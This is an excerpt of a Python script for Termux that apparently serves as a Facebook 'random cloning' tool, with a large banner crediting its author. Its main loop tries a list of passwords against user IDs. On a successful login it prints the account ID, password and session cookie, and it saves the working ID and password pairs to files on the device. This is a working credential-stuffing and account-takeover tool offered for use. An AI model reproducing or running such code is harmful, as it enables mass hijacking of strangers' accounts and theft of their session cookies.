...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100000958523962')
logo =("""
...
| $$\  $ | $$| $$             /$$  \ $$| $$  | $$| $$  | $$  | $$  | $$  \ $$
| $$ \/  | $$| $$$$$$$$      |  $$$$$$/|  $$$$$$/|  $$$$$$/ /$$$$$$| $$$$$$$/
|__/     |__/|________/       \______/  \______/  \______/ |______/|_______/ 
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝑺𝑶𝑱𝑰𝑩 𝑨𝑯𝑴𝑬𝑫 𝑿𝑹       \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝑺𝒐𝒋𝒊𝒃 𝑨𝒉𝒎𝒆𝒅 𝑿𝑹   \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35m ME turmux-badboy      \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning       \033[1;93m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35m𝑩𝑶𝑫_𝑴𝑬𝑱𝑨𝑱𝑰 99             \033[1;93m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m 𝑺𝑶𝑱𝑰𝑩 TERMUX COMMEND ZONE....           \033[1;93m ║
 ╚═════════════════[\033[1;32m 𝐌𝐄-𝑺𝑶𝑱𝑰𝑩 \033[1;32m]══════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝑴𝑬-𝑺𝑶𝑱𝑰𝑩OK👿] ' +uid+ ' | ' +ps+    '  \n[‎‎☺️]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝑴𝑬-𝑺𝑶𝑱𝑰𝑩-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/𝑴𝑬-𝑺𝑶𝑱𝑰𝑩-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝐌𝐄-𝑺𝑶𝑱𝑰𝑩{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
